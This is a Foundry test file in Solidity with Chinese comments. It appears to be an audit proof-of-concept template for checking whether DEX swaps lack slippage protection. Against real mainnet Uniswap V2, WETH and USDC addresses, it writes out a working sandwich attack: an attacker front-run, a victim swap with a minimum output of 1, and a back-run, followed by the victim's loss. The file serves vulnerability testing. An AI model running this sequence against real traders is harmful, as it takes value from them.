// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/**
 * @title Slippage / Sandwich Attack PoC Template
 * @notice 用於驗證 DEX swap 是否有適當的滑點保護
 * 
 * 使用方式：
 * 1. Fork mainnet: forge test --fork-url $RPC_URL
 * 2. 替換 TARGET_CONTRACT 為目標合約
 * 3. 運行 forge test -vvv --match-contract SlippageSandwichTest
 */

// ============ Interfaces ============

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    
    function getAmountsOut(uint256 amountIn, address[] calldata path) 
        external view returns (uint256[] memory amounts);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256, uint256, address, bytes calldata) external;
}

// ============ Test Contract ============

contract SlippageSandwichTest is Test {
    // Mainnet addresses (替換為目標鏈)
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    
    // 目標合約（替換為實際地址）
    // address constant TARGET_CONTRACT = 0x...;
    
    IUniswapV2Router router = IUniswapV2Router(UNISWAP_V2_ROUTER);
    
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    
    function setUp() public {
        // Fork mainnet at specific block
        // vm.createSelectFork(vm.envString("RPC_URL"), 18000000);
        
        // 給 attacker 和 victim 資金
        deal(WETH, attacker, 1000 ether);
        deal(WETH, victim, 100 ether);
    }
    
    /// @notice 測試 1: 檢查目標合約的 amountOutMin 設置
    function test_CheckSlippageParameters() public view {
        // 查看目標合約的 swap 參數
        // 如果 amountOutMin = 0 或 1，報告漏洞
        
        emit log("=== Slippage Parameter Check ===");
        emit log("TODO: Read target contract's swap parameters");
        emit log("Look for: amountOutMinimum = 0 or 1");
        emit log("Look for: sqrtPriceLimitX96 = 0");
        emit log("Look for: deadline = block.timestamp");
    }
    
    /// @notice 測試 2: 模擬三明治攻擊
    function test_SandwichAttack() public {
        emit log("=== Sandwich Attack Simulation ===");
        
        // Step 1: 記錄初始狀態
        uint256 attackerInitialBalance = IERC20(USDC).balanceOf(attacker);
        
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = USDC;
        
        // Step 2: 計算 victim 預期獲得
        uint256[] memory expectedAmounts = router.getAmountsOut(100 ether, path);
        uint256 expectedOutput = expectedAmounts[1];
        emit log_named_uint("Victim expected USDC", expectedOutput);
        
        // Step 3: Attacker front-run（大量買入推高價格）
        vm.startPrank(attacker);
        IERC20(WETH).approve(address(router), type(uint256).max);
        
        uint256[] memory frontRunAmounts = router.swapExactTokensForTokens(
            500 ether,  // 大額買入
            0,          // 攻擊者自己不需要滑點保護
            path,
            attacker,
            block.timestamp
        );
        emit log_named_uint("Attacker front-run USDC received", frontRunAmounts[1]);
        vm.stopPrank();
        
        // Step 4: Victim 交易（模擬無滑點保護）
        vm.startPrank(victim);
        IERC20(WETH).approve(address(router), type(uint256).max);
        
        uint256[] memory victimAmounts = router.swapExactTokensForTokens(
            100 ether,
            1,          // ⚠️ 無滑點保護！
            path,
            victim,
            block.timestamp
        );
        uint256 actualOutput = victimAmounts[1];
        emit log_named_uint("Victim actual USDC received", actualOutput);
        vm.stopPrank();
        
        // Step 5: Attacker back-run（賣出獲利）
        vm.startPrank(attacker);
        address[] memory reversePath = new address[](2);
        reversePath[0] = USDC;
        reversePath[1] = WETH;
        
        IERC20(USDC).approve(address(router), type(uint256).max);
        router.swapExactTokensForTokens(
            IERC20(USDC).balanceOf(attacker),
            0,
            reversePath,
            attacker,
            block.timestamp
        );
        vm.stopPrank();
        
        // Step 6: 計算損失
        uint256 victimLoss = expectedOutput - actualOutput;
        uint256 victimLossPercent = (victimLoss * 100) / expectedOutput;
        
        emit log("");
        emit log("=== Attack Results ===");
        emit log_named_uint("Victim expected", expectedOutput);
        emit log_named_uint("Victim received", actualOutput);
        emit log_named_uint("Victim loss (USDC)", victimLoss);
        emit log_named_uint("Victim loss (%)", victimLossPercent);
        
        // 如果損失超過 5%，確認漏洞
        if (victimLossPercent > 5) {
            emit log("");
            emit log("[CRITICAL] Sandwich attack successful!");
            emit log("Victim lost significant value due to no slippage protection");
        }
    }
    
    /// @notice 測試 3: 對比有無滑點保護
    function test_CompareWithAndWithoutSlippage() public {
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = USDC;
        
        // 獲取預期輸出
        uint256[] memory expectedAmounts = router.getAmountsOut(100 ether, path);
        uint256 expectedOutput = expectedAmounts[1];
        
        // 計算合理的 minOutput (1% 滑點)
        uint256 minOutputWithSlippage = expectedOutput * 99 / 100;
        
        emit log("=== Slippage Protection Comparison ===");
        emit log_named_uint("Expected output", expectedOutput);
        emit log_named_uint("Min output (1% slippage)", minOutputWithSlippage);
        emit log_named_uint("Vulnerable min output", 1);
        
        emit log("");
        emit log("With amountOutMin = 1:");
        emit log("  -> Attacker can extract up to 99.9999% of value");
        
        emit log("");
        emit log("With amountOutMin = expectedOutput * 99%:");
        emit log("  -> Maximum loss limited to 1%");
    }
}
